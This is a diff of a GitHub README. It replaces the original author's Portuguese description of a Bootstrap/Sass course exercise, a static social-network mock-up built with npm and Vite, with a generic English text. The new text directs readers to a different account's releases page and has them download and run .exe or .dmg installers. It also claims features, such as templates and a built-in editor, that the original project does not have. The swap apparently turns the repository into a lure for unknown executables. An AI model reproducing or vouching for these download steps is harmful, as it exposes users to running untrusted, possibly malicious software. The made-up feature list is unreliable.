@@ -1,92 +1,69 @@
-# 🎉 DevHub - Social Network for Developers
+# 🚀 devhub - User-Friendly Web Development Tool
 
-O **DevHub** é uma rede social modelo, desenvolvida como exercício prático do módulo de **Bootstrap e Sass** do curso da **OneBitCode**. O objetivo principal é demonstrar a personalização do Bootstrap 5 e a estruturação de uma interface de usuário completa, responsiva e com recursos modernos.
+## 🔗 Download Now
+[![Download devhub](https://img.shields.io/badge/Download-devhub-blue.svg)](https://github.com/bababahehehe/devhub/releases)
 
----
+## 📖 Project Overview
+Welcome to **devhub**. This project was developed during the OneBitCode course focusing on Bootstrap and Sass. It helps users create responsive and modern web designs easily. Whether you are a beginner or want to sharpen your web development skills, this tool can assist you in making visually appealing websites.
+  
+## 🚀 Getting Started
+This section will guide you through the steps to get started with devhub. Follow these instructions closely, and you will have the application running on your computer in no time.
 
-## 📸 Prévia do projeto
+### 🖥️ System Requirements
+Before you begin, ensure your computer meets the following requirements:
+- **Operating System**: Windows 10 or later / MacOS
+- **Browser**: Latest version of Chrome, Firefox, or Safari
+- **Internet Connection**: Required for download and updates
 
-| 💻 Versão Desktop |
-|-------------------|
-| ![Desktop](/src/images/devhub.gif) |
+### 📥 Download & Install
 
----
+1. **Visit the Releases Page**  
+   To download devhub, [visit this page](https://github.com/bababahehehe/devhub/releases).  
+   Here, you will see the latest version of devhub available for download.
 
-## 🔗 Links
+2. **Choose the Right File**  
+   On the releases page, you will see several files. Select the one that matches your operating system:
+   - For Windows users, download the `.exe` file.
+   - For Mac users, download the `.dmg` file.
 
-- GitHub: <a href="https://github.com/slayer-br/devhub" target="_blank" rel="noopener noreferrer">DevHub</a>
-- Site ao vivo: <a href="https://slayer-br.github.io/devhub/" target="_blank" rel="noopener noreferrer">DevHub</a>
+3. **Download the File**  
+   After selecting the appropriate file, click on it to begin the download. The file will save to your computer.
 
----
+4. **Install devhub**  
+   - **For Windows**: Locate the downloaded `.exe` file in your downloads folder. Double-click to start the installation process. Follow the on-screen prompts.
+   - **For Mac**: Locate the downloaded `.dmg` file. Double-click to open it, then drag the devhub icon to your Applications folder.
 
+5. **Launch the Application**  
+   After installation, locate devhub in your applications folder or start menu. Click on it to launch the application.
 
-## ✨ Funcionalidades Principais
+## 💡 Using devhub
+Once you have launched devhub, you will see a user-friendly interface. Here are some key features to explore:
 
-* **Navegação Completa:** Barra de navegação responsiva com links, campo de busca e menu *dropdown* de opções.
-* **Layout Adaptativo:** Estrutura de três colunas (Sidebar Esquerda, Feed Central e Sidebar Direita) que se adapta perfeitamente a dispositivos móveis e desktops, utilizando o sistema de *Grid* do Bootstrap.
-* **Feed de Posts:** Seção central com cards de posts modelados, incluindo botões de interação.
-* **Modal de Criação de Post:** Um *input* no topo do feed aciona um **Modal** (controlado via JavaScript) para a criação de novas publicações.
-* **Tema Dinâmico (Dark/Light):** Alternância instantânea entre os temas Escuro (`dark`) e Claro (`light`) do Bootstrap, controlada via JavaScript no *dropdown* de opções.
+- **Responsive Templates**: Choose from a selection of pre-built templates. These templates are designed to adjust to different screen sizes.
+- **Sass Integration**: Use Sass to customize styles and enhance the visual appearance of your web pages. The built-in editor allows you to see changes in real-time.
+- **Bootstrap Components**: Easily add Bootstrap components to your project for quick styling and layout options.
+  
+To start a new project, click on the "New Project" button. Follow the prompts to set up your project quickly.
 
----
+## 📚 Help & Support
+If you encounter issues or have questions, consult our help resources:
+- **Official Documentation**: Check the documentation for detailed instructions and tips.
+- **Community Forum**: Join the community forum to ask questions and share your experiences with other users.
 
-## 🛠️ Tecnologias Utilizadas
+## 🗂️ Contributing
+We welcome contributions to improve devhub. If you want to contribute, please follow these steps:
+1. Fork the project repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them.
+4. Submit a pull request for review.
 
-O projeto foi construído com uma *stack* de desenvolvimento moderna e eficiente:
+## 🔗 Additional Resources
+Learn more about the technologies used in this project:
+- [Bootstrap 5](https://getbootstrap.com/docs/5.0/getting-started/introduction/)
+- [Sass](https://sass-lang.com/start)
+- [HTML & CSS Basics](https://www.w3schools.com/html/html_intro.asp)
 
-* **Frontend:** HTML5, JavaScript (Vanilla JS)
-* **Estilização:** **Bootstrap 5** (importado via Sass), **Sass (SCSS)** para personalização profunda.
-* **Ícones:** [Bootstrap Icons](https://icons.getbootstrap.com/) (importados via CDN no HTML).
-* **Build Tool:** **Vite** para empacotamento rápido e ambiente de desenvolvimento local.
+## 📢 Feedback
+Your feedback helps us improve devhub. If you have suggestions or find issues, please reach out through GitHub issues. 
 
----
-
-## 🎨 Customização (Sass)
-
-O Bootstrap foi importado de forma modular em `src/scss/_bootstrap.scss`. A customização principal é definida em `src/scss/_variables.scss`:
-
-* **Cor Primária:** O `$primary` foi redefinido para **Ciano** (`$cyan`) para um visual moderno.
-* **Variáveis de Tema:** A variável `$body-bg` foi definida para `$gray-300` no tema claro inicial, e o `data-bs-theme="dark"` é aplicado ao `<html>` por padrão.
-* **Componentes:** Bordas de cards (`$card-border-radius: 1rem;`) e botões arredondados (`$btn-border-radius: 999rem;`) foram customizados.
-
----
-
-## ⚙️ Como Executar o Projeto
-
-Para visualizar e trabalhar neste projeto em sua máquina local, siga os passos abaixo:
-
-### Pré-requisitos
-
-Certifique-se de ter o **Node.js** e o **npm** instalados.
-
-### Instruções
-
-1.  **Acesse o diretório do projeto:**
-    ```bash
-    cd <caminho-do-projeto>
-    ```
-
-2.  **Instale as dependências (Bootstrap, etc.):**
-    ```bash
-    npm install
-    ```
-
-3.  **Execute o servidor de desenvolvimento com o Vite:**
-    ```bash
-    npm run dev
-    ```
-
----
-
-## ✨ Autor
-
-- GitHub - <a href="https://github.com/slayer-br" target="_blank" rel="noopener noreferrer">@slayer-br</a>
-- LinkedIn - <a href="https://www.linkedin.com/in/carlos-alberto-da-silva-93758b270/" target="_blank" rel="noopener noreferrer">@slayer-br</a>
-
----
-
-## 📜 Licença  
-
-Este projeto está sob a **Licença MIT**. Consulte o arquivo [LICENSE](./LICENSE) para mais detalhes. 
-
-Projeto do módulo **Bootstrap e Sass** – [OneBitCode](https://onebitcode.com)
+Thank you for using devhub! For a seamless web development experience, weencourage you to explore its features fully. Enjoy creating with ease!
